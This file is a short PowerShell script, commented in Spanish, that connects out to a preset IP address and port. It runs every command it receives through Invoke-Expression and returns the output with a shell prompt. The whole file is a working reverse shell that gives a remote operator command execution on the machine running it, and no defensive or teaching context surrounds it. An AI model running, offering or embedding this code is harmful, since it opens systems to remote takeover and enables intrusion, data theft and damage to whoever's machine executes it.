param (
    [string]$ip = "192.168.50.82", # Dirección IP por defecto
    [int]$port = 3535             # Puerto por defecto
)

$client = New-Object Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$buffer = New-Object byte[] 1024
$encoder = New-Object Text.ASCIIEncoding

while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = $encoder.GetString($buffer, 0, $i)
    $result = (iex $data 2>&1 | Out-String)
    $prompt = $result + "PS " + (pwd).Path + "> "
    $out = $encoder.GetBytes($prompt)
    $stream.Write($out, 0, $out.Length)
    $stream.Flush()
}

